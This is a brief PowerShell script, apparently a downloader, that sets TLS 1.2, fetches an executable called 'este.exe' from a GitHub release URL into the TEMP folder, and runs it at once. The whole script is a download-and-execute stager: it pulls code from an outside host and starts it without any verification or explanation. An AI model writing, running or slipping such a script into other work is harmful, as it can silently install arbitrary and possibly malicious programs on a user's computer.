[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/hola/este.exe"
$destino = "$env:TEMP\este.exe"

Invoke-WebRequest -Uri $url -OutFile $destino
Start-Process -FilePath $destino
